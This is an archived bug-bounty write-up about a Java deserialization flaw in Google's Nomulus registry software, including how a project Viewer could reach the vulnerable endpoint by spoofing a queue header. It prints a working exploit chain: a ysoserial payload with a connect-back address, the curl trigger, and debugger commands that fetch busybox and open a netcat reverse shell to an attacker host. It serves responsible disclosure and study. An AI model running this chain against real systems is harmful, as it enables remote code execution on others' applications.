---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-08-25_the-nomulus-rift.md
original_filename: 2021-08-25_the-nomulus-rift.md
title: The Nomulus rift
category: documents
detected_topics:
- command-injection
- access-control
- otp
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- access-control
- otp
- automation-abuse
- api-security
language: en
raw_sha256: 24129cb4beec5ea5a70bb9eb26a0af132517a529455b856ed32d01087dac5a3a
text_sha256: 3e420c3a264667f6fd96416af97f664bb1123b9cc343f92a029797ae08494623
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: true
---

# The Nomulus rift

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-08-25_the-nomulus-rift.md
- Source Type: markdown
- Detected Topics: command-injection, access-control, otp, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: True
- Raw SHA256: `24129cb4beec5ea5a70bb9eb26a0af132517a529455b856ed32d01087dac5a3a`
- Text SHA256: `3e420c3a264667f6fd96416af97f664bb1123b9cc343f92a029797ae08494623`


## Content

---
title: "The Nomulus rift"
url: "https://irsl.medium.com/the-nomulus-rift-935a3c4d9300"
authors: ["Imre Rad (@ImreRad)"]
programs: ["Google (Nomulus)"]
bugs: ["Insecure deserialization"]
publication_date: "2021-08-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3391
scraped_via: "browseros"
---

# The Nomulus rift

The Nomulus rift
Imre Rad
Follow
6 min read
·
Aug 25, 2021

27

In the middle of 2020, I decided to look for vulnerabilities in some open source products of Google. They have many such projects, a public inventory of them can be found at https://opensource.google/. Given I have some background at the domain registration business, I chose Nomulus. It is a “scalable, cloud-based service for operating top-level domains (TLDs). It is the authoritative source for the TLDs that it runs, meaning that it is responsible for tracking domain name ownership and handling registrations, renewals, availability checks, and WHOIS requests. End-user registrants (i.e. people or companies that want to register a domain name) use an intermediate domain name registrar acting on their behalf to interact with the registry.”

Actually, it is the software behind servicing the .google TLD :)

While reviewing the source code, I quickly identified a potential Java deserialization flaw, but the webservice method was bound to the “AppEngine admin” role. Even though I learned that App Engine’s concept of an “admin” includes all project owners, editors and viewers, I felt this wouldn’t be a valid attack scenario so I didn’t even bother with verifying whether it is actually exploitable or not.

Later on, in the first days of 2021, I resumed the work on this research, since I learned in the meanwhile that Google VRP team does accept submissions where the attack is started as a “viewer” and accomplishes something it is not supposed to.

After confirming that my suspicion was correct, I filed a bug ticket on January 5, 2021.

The original submission

Nomulus is a top level domain name registry solution of Google, the open source application runs on AppEngine. The product is also used internally by Google.

Nomulus features BigQuery integration for some reporting workloads, the tasks are executed asyncronously as AppEngine tasks.

I found the BigqueryPollJobAction task expects a serialized Java stream int HTTP request body and it is processed via the standard ObjectInputStream:

https://github.com/google/nomulus/blob/master/core/src/main/java/google/registry/export/BigqueryPollJobAction.java

Since Hibernate is on the class path, this can be turned into remote code execution (for details about that, see below).

The BigqueryPollJobAction action is protected by Auth.AUTH_INTERNAL_OR_ADMIN authorization, which is documented here:
https://github.com/google/nomulus/blob/master/docs/authentication-framework.md

“AUTH_INTERNAL_OR_ADMIN: Allow access only by admin users or internal requests. This is appropriate for actions that should only be accessed by someone trusted (as opposed to anyone with a Google login). This currently allows only the INTERNAL and API methods, meaning that an admin user cannot authenticate themselves via the legacy authentication mechanism, which is used only for the registrar console. The minimum level is APP, because we don’t require a user for internal requests, but the user policy is ADMIN, meaning that if there is a user, it needs to be an admin.”

The definition of “admin” in App Engine context is anyone with a project level role, including the role “Viewer”.
This was taken into consideration by the project authors at some level, read the comments here:
https://github.com/google/nomulus/blob/master/core/src/main/java/google/registry/request/auth/AppEngineInternalAuthenticationMechanism.java

* App Engine allows app admins to set these headers for testing purposes. This means that this auth
* method is somewhat unreliable — any app admin can access any internal endpoint and pretend to be
* the app itself by setting these headers, which would circumvent any finer-grained authorization
* if we added it in the future (assuming we did not apply it to the app itself). And App Engine’s
* concept of an “admin” includes all project owners, editors and viewers. So anyone with access to
* the project will be able to access anything the app itself can access.

So at this point the question is, according to your risk assessment methodology, would it pose any security risk if a user with a viewer role was able to spawn a remote shell, because that is possible today.

The payload that drives Hibernate into executing commands can be generated using the ysoserial project (https://github.com/frohoff/ysoserial), after modifying pom.xml to depend on hibernate core 5.4.4:

java -Dhibernate5=true -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 “/base/alloc/tmpfs/dynamic_runtimes/java_jre/a3d5775c4b01bd4c/bin/java -agentlib:jdwp=transport=dt_socket,address=213.222.165.237:8000” > Hibernate1–544–4.pl

Note the current version of Nomulus depends on 5.4.23 of Hibernate, but the payload generated above works perfectly fine.

This payload will launch a java VM, load the JDWP transport and connect back to the attacker; 213.222.165.237:8000 in the example. The JDB listener side can be executed with these params:

jdb -connect com.sun.jdi.SocketListen:port=8000

Some helper variables for the further commands:

export NOMULUS_PROJECT_NAME=nomulus-test-20210101
export NOMULUS_BACKEND_HOST=”backend-dot-$NOMULUS_PROJECT_NAME.ew.r.appspot.com”

To get an authenticated session, visit https://$NOMULUS_BACKEND_HOST/ in your browser as the user with the viewer role, then copy out the SACSID cookie. Then:

export COOKIE=SACSID=…

Open bigquery in cloud console, in job history menu, project history tab you should find some jobs that have been completed successfully (important, the action verifies that).
At the job details, you can find the Job ID as something like this:
Job ID: nomulus-test-20210101:US.load-backup-111-Registrar

You need the string after the country code, something like this:

export BIGQUERY_JOB_ID=load-backup-111-Registrar

Note: since the initial assumption is that the attacker has viewer role on the project, this info can be obtained easily.

Get Imre Rad’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Then to actually trigger the exploit, the final command is:

curl -v -H “X-AppEngine-QueueName: foo” -H “X-DomainRegistry-ProjectId: $NOMULUS_PROJECT_NAME” -H “X-DomainRegistry-JobId: $BIGQUERY_JOB_ID” -H “Cookie: $COOKIE” — data-binary @Hibernate1–544–4.pl “https://$NOMULUS_BACKEND_HOST/_dr/task/pollBigqueryJob"

If you get error 304, it means the specified JobId was invalid. If you get “OK” quickly, it means the job did not succeed (so the malicious payload was not processed).

The JDB session will look something like this:

C:\Program Files\Java\jdk1.8.0_231\bin>jdb -connect com.sun.jdi.SocketListen:port=8000
Listening at address: DESKTOP-43RNLKU:8000
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb …
>
VM Started: No frames on the current call stack

main[1]

Once you have got a jdb session up and running, you can turn it into a more convenient reverse shell by executing steps like the following:

stop in java.lang.Object.equals
run
clear java.lang.Object.equals

eval java.lang.Class.forName(“java.nio.channels.Channels”)

eval new java.io.FileOutputStream(“/tmp/sh”).getChannel().transferFrom(java.nio.channels.Channels.newChannel(new java.net.URL(“https://some/place/with/static/busybox").openStream()), 0, java.lang.Long.MAX_VALUE);
eval new java.io.File(“/tmp/sh”).setExecutable(true, false)
eval new java.io.FileOutputStream(“/tmp/nc”).getChannel().transferFrom(java.nio.channels.Channels.newChannel(new java.net.URL(“https://some/place/with/static/busybox").openStream()), 0, java.lang.Long.MAX_VALUE);
eval new java.io.File(“/tmp/nc”).setExecutable(true, false)

eval java.lang.Runtime.getRuntime().exec(“/tmp/nc attackerdomain.tld 51111 -e /tmp/sh”).waitFor()

… in the other window …

root@debian-2gb-nbg1–1:/# nc -v -l -p 51111
listening on [any] 51111 …
connect to [168.119.114.130] from 145.206.178.107.gae.googleusercontent.com [107.178.206.145] 57620

Note: this is still not perfect as the command aliases are missing, but it proves the concept.

Back to the topic of risk for one more thought, I think not even project editors should be able to obtain a reverse shell in their App Engine application — as that would make it possible to circumvent audit related requirements.

And the isssue is still there

When I received an automated email from Google, claiming the bug has been resolved, I looked at their Github repo, trying to find what they actually did. This is the actual commit.

I found the ObjectInputStream was still there in BigqueryPollJobAction.java, but the authorization annotation of the class was changed to Auth.AUTH_INTERNAL_ONLY.

The corresponding implementation of “Internal Only auth” can be found here:
https://github.com/google/nomulus/blob/master/core/src/main/java/google/registry/request/auth/AppEngineInternalAuthenticationMechanism.java

It does not do anything more than checking the presence of the X-AppEngine-QueueName header. And as you could guess, it is not an effective protection measure against this type of attack, as users with Viewer role could still abuse the system by sending a request with that header set.

To verify myself, I went to through the painful deployment process of the service once again using the head of the official repo (and blamed myself for not making more notes originally). I found the original exploit still worked, the only change I made was the IP address where to connect back to :)

So I filed one more ticket to Google. The submission was accepted, doubling the original reward overall. If you are interested in, the final fix of the issue can be found here:

https://github.com/google/nomulus/commit/***REDACTED-SUSPECT-TOKEN***Timeline

January 5, 2021: Bug ticket filed

January 12, 2021: “Nice catch!”

February 22, 2021: “Our systems show that all the bugs we decided to create based on your report have been fixed.”

February 22, 2021: New ticket filed

March 5, 2021: “Thanks a lot! I’ve reopened the internal bug.”

April 9, 2021: “Our systems show that all the bugs we decided to create based on your report have been fixed.”
